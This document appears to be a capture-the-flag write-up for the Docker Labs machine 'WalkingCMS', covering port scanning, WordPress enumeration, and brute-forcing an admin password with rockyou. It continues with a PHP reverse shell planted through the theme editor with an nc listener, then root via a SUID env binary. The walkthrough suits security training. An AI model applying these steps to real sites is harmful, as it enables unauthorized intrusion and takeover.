---
{"dg-publish":true,"permalink":"/write-ups/docker-labs/walking-cms/","tags":["CTF","write-up"]}
---


![Pasted image 20241215111508.png|300](/img/user/attachments/Pasted%20image%2020241215111508.png)

---

> [!INFO] Info about WalkingCMS
>  Difficulty: Easy

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

---
# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 80 -oN nmap_enum
```
## OS
Linux
## Port 80 - Apache
tcp open  http    **Apache** httpd **2.4.57** ((Debian))
![Pasted image 20241215111928.png](/img/user/attachments/Pasted%20image%2020241215111928.png)
### Fuzz
```shell
ffuf -c -t 100 -u http://<TARGET>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -mc all -fc 404 -e .php,.html,.txt
```
### Wordpress
Version 6.4.3
![Pasted image 20241215124237.png](/img/user/attachments/Pasted%20image%2020241215124237.png)

---
# Vulnerability analysis
## Wordpress
6.4.3
```shell
wpscan -e vp,u --url http://172.17.0.2/wordpress --api-token="7890hm..877hjs" --plugins-detection aggressive
```
![Pasted image 20241215130627.png](/img/user/attachments/Pasted%20image%2020241215130627.png)

---
# Exploitation

## Brute force
Using the username, I tried a brute force attack
```shell
wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt
```
![Pasted image 20241215130923.png|500](/img/user/attachments/Pasted%20image%2020241215130923.png)
## RCE Admin panel
1. Go to *appearance* then *theme code editor*
![Pasted image 20241215175704.png](/img/user/attachments/Pasted%20image%2020241215175704.png)
2. Select *create*
   ![Pasted image 20241215175809.png](/img/user/attachments/Pasted%20image%2020241215175809.png)
3. Write a name and *Create New File*
   ![Pasted image 20241215180904.png|500](/img/user/attachments/Pasted%20image%2020241215180904.png)
4. Write the *PHP* code of reverse shell. I use */usr/share/webshells/php/php-reverse-shell.php*
   ![Pasted image 20241215181052.png](/img/user/attachments/Pasted%20image%2020241215181052.png)
5. Upload file bottom
   Now the file is stored on */var/www/html/wordpress/wp-content/themes/twentytwentytwo/test1.php*
6. Set the listener
```shell
rlwrap nc -lnvp 4747
```
6. To access to the *test1.php* we need to go to 
   *172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/test1.php*
   And we got the shell as *www-data*
   ![Pasted image 20241215181540.png](/img/user/attachments/Pasted%20image%2020241215181540.png)

---
# Privilege escalation
## SUID
Check SUID files
```shell
find / -type f -perm -4000 -ls 2>/dev/null
```
The uncommon *SUID* binary is *env*
![Pasted image 20241215183225.png](/img/user/attachments/Pasted%20image%2020241215183225.png)
Use *gtfobins* to check a way to leverage this.
![Pasted image 20241215183352.png|400](/img/user/attachments/Pasted%20image%2020241215183352.png)
```shell
env /bin/bash -p
```
![Pasted image 20241215183438.png](/img/user/attachments/Pasted%20image%2020241215183438.png)

---
